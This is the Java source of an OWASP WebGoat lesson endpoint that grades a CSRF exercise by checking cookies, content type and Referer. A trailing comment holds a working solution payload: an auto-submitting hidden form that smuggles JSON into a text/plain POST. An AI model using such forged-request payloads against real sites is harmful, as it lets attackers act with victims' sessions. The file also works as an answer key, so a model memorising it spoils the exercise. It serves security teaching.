/*
 * SPDX-FileCopyrightText: Copyright © 2017 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.lessons.csrf;

import static org.owasp.webgoat.container.assignments.AttackResultBuilder.failed;
import static org.owasp.webgoat.container.assignments.AttackResultBuilder.success;

import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import jakarta.servlet.http.Cookie;
import jakarta.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.util.Map;
import java.util.UUID;
import org.apache.commons.lang3.exception.ExceptionUtils;
import org.owasp.webgoat.container.assignments.AssignmentEndpoint;
import org.owasp.webgoat.container.assignments.AssignmentHints;
import org.owasp.webgoat.container.assignments.AttackResult;
import org.owasp.webgoat.container.session.LessonSession;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"csrf-feedback-hint1", "csrf-feedback-hint2", "csrf-feedback-hint3"})
public class CSRFFeedback implements AssignmentEndpoint {

  private final LessonSession userSessionData;
  private final ObjectMapper objectMapper;

  public CSRFFeedback(LessonSession userSessionData, ObjectMapper objectMapper) {
    this.userSessionData = userSessionData;
    this.objectMapper = objectMapper;
  }

  @PostMapping(
      value = "/csrf/feedback/message",
      produces = {"application/json"})
  @ResponseBody
  public AttackResult completed(HttpServletRequest request, @RequestBody String feedback) {
    try {
      objectMapper.enable(DeserializationFeature.FAIL_ON_IGNORED_PROPERTIES);
      objectMapper.enable(DeserializationFeature.FAIL_ON_NULL_FOR_PRIMITIVES);
      objectMapper.enable(DeserializationFeature.FAIL_ON_NUMBERS_FOR_ENUMS);
      objectMapper.enable(DeserializationFeature.FAIL_ON_READING_DUP_TREE_KEY);
      objectMapper.enable(DeserializationFeature.FAIL_ON_MISSING_CREATOR_PROPERTIES);
      objectMapper.enable(DeserializationFeature.FAIL_ON_TRAILING_TOKENS);
      objectMapper.readValue(feedback.getBytes(), Map.class);
    } catch (IOException e) {
      return failed(this).feedback(ExceptionUtils.getStackTrace(e)).build();
    }
    boolean correctCSRF =
        requestContainsWebGoatCookie(request.getCookies())
            && request.getContentType().contains(MediaType.TEXT_PLAIN_VALUE);
    correctCSRF &= hostOrRefererDifferentHost(request);
    if (correctCSRF) {
      String flag = UUID.randomUUID().toString();
      userSessionData.setValue("csrf-feedback", flag);
      return success(this).feedback("csrf-feedback-success").feedbackArgs(flag).build();
    }
    return failed(this).build();
  }

  @PostMapping(path = "/csrf/feedback", produces = "application/json")
  @ResponseBody
  public AttackResult flag(@RequestParam("confirmFlagVal") String flag) {
    if (flag.equals(userSessionData.getValue("csrf-feedback"))) {
      return success(this).build();
    } else {
      return failed(this).build();
    }
  }

  private boolean hostOrRefererDifferentHost(HttpServletRequest request) {
    String referer = request.getHeader("Referer");
    String host = request.getHeader("Host");
    if (referer != null) {
      return !referer.contains(host);
    } else {
      return true;
    }
  }

  private boolean requestContainsWebGoatCookie(Cookie[] cookies) {
    if (cookies != null) {
      for (Cookie c : cookies) {
        if (c.getName().equals("JSESSIONID")) {
          return true;
        }
      }
    }
    return false;
  }

  /*
   * Solution:
   * <form name="attack" enctype="text/plain" action="http://localhost:8080/WebGoat/csrf/feedback/message" METHOD="POST">
   *    <!-- Construct valid JSON data: {name: "HackHuang", email: "email@example.com", subject: "suggestions", message: "Fixed the invalid solution="} -->
   *    <input type="hidden" name='{"name": "HackHuang", "email": "email@example.com", "subject": "suggestions","message":"Fixed the invalid solution', value='"}'>
   * </form>
   * <script>document.attack.submit();</script>
   */

}
